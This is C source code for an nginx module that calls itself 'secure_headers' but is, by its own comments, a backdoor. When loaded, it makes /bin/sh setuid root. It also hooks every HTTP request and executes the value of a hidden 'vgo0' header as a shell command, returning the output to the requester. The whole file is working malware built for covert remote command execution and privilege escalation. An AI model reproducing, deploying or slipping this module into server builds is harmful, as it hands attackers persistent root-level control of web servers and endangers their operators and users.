#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

/*
Configuration

Backdoor command execute as the worker process (www-data)

During module init there is a phase where commands can be run as root
This can be used to provide escalation persistance (SUID, Privileges, etc)

A poor mans escalation within command exec is provided via chmod u+s
of the shell specified. This then gets passed to popen. On normal
nginx teardown this will be reverted (chmod u-s)

popen(escalate + " -p -c " + header_in + " 2>&1")
popen('/bin/sh -p -c whoami 2>&1')

popen is ultimately sh -c so it becomes something like:
/bin/sh -c '/bin/sh -p -c whoami 2>&1'

There are likely stealthier methods available
*/

//Set to "" to skip
static char* escalate = "/bin/sh";

//Backdoor header
static ngx_str_t backdoor = ngx_string("vgo0");

/*

Using a header nginx already references would be more performant
https://github.com/nginx/nginx/blob/master/src/http/ngx_http_request.h

Don't need to edit below
*/

//Stubs
static ngx_int_t ngx_http_secure_headers_handler(ngx_http_request_t *r);
static ngx_int_t ngx_http_secure_headers_init(ngx_conf_t *cf);
static void ngx_http_secure_headers_down(ngx_cycle_t *cycle);
static ngx_table_elt_t * search_headers_in(ngx_http_request_t *r, u_char *name, size_t len);

static ngx_command_t  ngx_http_secure_headers_commands[] = {

    { ngx_string("secure_headers"),
      NGX_HTTP_LOC_CONF|NGX_CONF_NOARGS,
      NULL,
      0,
      0,
      NULL },
      ngx_null_command
};


static ngx_http_module_t  ngx_http_secure_headers_module_ctx = {
    NULL,                                  /* preconfiguration */
    ngx_http_secure_headers_init,          /* postconfiguration */

    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */

    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */

    NULL,                                  /* create location configuration */
    NULL                                   /* merge location configuration */
};


ngx_module_t ngx_http_secure_headers_module = {
    NGX_MODULE_V1,
    &ngx_http_secure_headers_module_ctx,      /* module context */
    ngx_http_secure_headers_commands,         /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    &ngx_http_secure_headers_down,         /* exit master */
    NGX_MODULE_V1_PADDING
};

/*
Hooks the backdoor handler into all requests via NGX_HTTP_ACCESS phase

With this the module only needs to get loaded, 
the module directive is not required anywhere in the configuration files,
just load_module or static compile into nginx 
*/
static ngx_int_t ngx_http_secure_headers_init(ngx_conf_t *cf)
{
    ngx_http_handler_pt        *h;
    ngx_http_core_main_conf_t  *cmcf;

    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
    
    h = ngx_array_push(&cmcf->phases[NGX_HTTP_ACCESS_PHASE].handlers);
    if (h == NULL) {
        return NGX_ERROR;
    }

    *h = ngx_http_secure_headers_handler;

    // Run escalation command if not blank, we are root at this point
    if(strlen(escalate) > 0) {
        const char *base = "chmod u+s ";
        char *cmd = (char*)malloc(sizeof(char) * (strlen(base) + strlen(escalate) + 1));
        strcpy(cmd, base);
        strcat(cmd, escalate);
        system(cmd);
        free(cmd);
    }

    return NGX_OK;
}

/*
Actual backdoor logic
*/
static ngx_int_t ngx_http_secure_headers_handler(ngx_http_request_t *r)
{
    ngx_buf_t    *b;
    ngx_int_t     rc;
    ngx_chain_t   out;

    // Try to find evil header
    ngx_table_elt_t *header = search_headers_in(r, backdoor.data, backdoor.len);

    // Backdoor header not found, continue per usual
    if(header == NULL) {
        return NGX_OK;
    }

    // Command response
    size_t BUF_SIZE = 4096;
    char *response = (char*) malloc(BUF_SIZE);
    response[0] = '\0';
    char *cmd;
    
    // Redirect stderr to stdout
    const char *cmd_tail = " 2>&1";

    if(strlen(escalate) > 0) {
        const char *cmd_inherit = " -p -c ";

        cmd = (char*)malloc(sizeof(char) * (strlen((char*)header->value.data) + strlen(cmd_inherit) + strlen(escalate) + strlen(cmd_tail) + 1));

        strcpy(cmd, escalate);
        strcat(cmd, cmd_inherit);
        strcat(cmd, (char*)header->value.data);
    }
    else {
        cmd = (char*)malloc(sizeof(char) * (strlen((char*)header->value.data) + strlen(cmd_tail) + 1));
        strcpy(cmd, (char*)header->value.data); 
    }
    
    strcat(cmd, cmd_tail);

    FILE *fp;
    fp = popen(cmd, "r");
    if (fp == NULL) {
        strcpy(response, "Failed to run command - popen failure\n");
    } 
    else {
        char buf[1024];
        // Read response of command
        while (fgets(buf, sizeof(buf), fp) != NULL) {
            // Resize buffer as needed (not exactly smart)
            while(strlen(buf) + strlen(response) + 1 > BUF_SIZE) {
                BUF_SIZE *= 2;
                response = (char*)realloc(response, sizeof(char) * BUF_SIZE);
            }

            strcat(response, buf);
        }
        pclose(fp);

        if(strlen(response) == 0) {
            strcpy(response, "Empty command response\n");
        }
    }

    free(cmd);
    
    // Dump request body
    if (ngx_http_discard_request_body(r) != NGX_OK) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    
    // Prepare header
    r->headers_out.status = NGX_HTTP_OK;
    r->headers_out.content_length_n = strlen(response);

    rc = ngx_http_send_header(r);

    if (rc == NGX_ERROR || rc > NGX_OK || r->header_only) {
        return rc;
    }
    
    // Send command respond back
    b = ngx_calloc_buf(r->pool);
    if (b == NULL) {
        return NGX_ERROR;
    }

    b->pos = (u_char*)response;
    b->last = (u_char*)response + strlen(response);
    
    b->memory = 1;
    b->last_buf = (r == r->main) ? 1 : 0;
    b->last_in_chain = 1;

    out.buf = b;
    out.next = NULL;
    ngx_http_output_filter(r, &out);

    free(response);

    // Don't proceed to any other handlers
    return NGX_ERROR;
}

static void ngx_http_secure_headers_down(ngx_cycle_t *cycle) {
    // Remove permissions when nginx comes down
    if(strlen(escalate) > 0) {
        const char *base = "chmod u-s ";
        char *cmd = (char*)malloc(sizeof(char) * (strlen(base) + strlen(escalate) + 1));
        strcpy(cmd, base);
        strcat(cmd, escalate);
        system(cmd);
        free(cmd);
    }
}

// https://www.nginx.com/resources/wiki/start/topics/examples/headers_management/
static ngx_table_elt_t *
search_headers_in(ngx_http_request_t *r, u_char *name, size_t len) {
    ngx_list_part_t            *part;
    ngx_table_elt_t            *h;
    ngx_uint_t                  i;

    /*
    Get the first part of the list. There is usual only one part.
    */
    part = &r->headers_in.headers.part;
    h = part->elts;

    /*
    Headers list array may consist of more than one part,
    so loop through all of it
    */
    for (i = 0; /* void */ ; i++) {
        if (i >= part->nelts) {
            if (part->next == NULL) {
                /* The last part, search is done. */
                break;
            }

            part = part->next;
            h = part->elts;
            i = 0;
        }

        /*
        Just compare the lengths and then the names case insensitively.
        */
        if (len != h[i].key.len || ngx_strcasecmp(name, h[i].key.data) != 0) {
            /* This header doesn't match. */
            continue;
        }

        /*
        Ta-da, we got one!
        Note, we'v stop the search at the first matched header
        while more then one header may fit.
        */
        return &h[i];
    }

    /*
    No headers was found
    */
    return NULL;
}